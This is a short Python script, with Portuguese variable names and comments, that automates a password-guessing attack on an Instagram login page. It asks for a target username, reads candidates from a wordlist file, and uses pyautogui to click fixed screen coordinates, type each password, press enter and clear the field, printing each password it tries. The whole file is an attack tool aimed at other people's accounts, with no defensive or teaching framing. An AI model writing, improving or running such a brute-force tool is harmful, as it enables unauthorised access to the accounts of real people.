
import time
import pyautogui

url = "https://www.instagram.com/"
user = input("\nUser: ")

wordlist = open('wordlist.txt', 'r').readlines()
pyautogui.click(x=1207,y=411)
time.sleep(1)
pyautogui.write(user)   
time.sleep(1)
pyautogui.press('TAB')
for senha in wordlist:
    time.sleep(1)
    pyautogui.write(senha)
    print(f"Senha testada ---> {senha}")
    time.sleep(1)
    pyautogui.press('enter')
    time.sleep(3)
    # requisiçao para pegar parametros na tela caso faça login
    pyautogui.hotkey('ctrl', 'a')
    pyautogui.press('backspace')
    time.sleep(3)
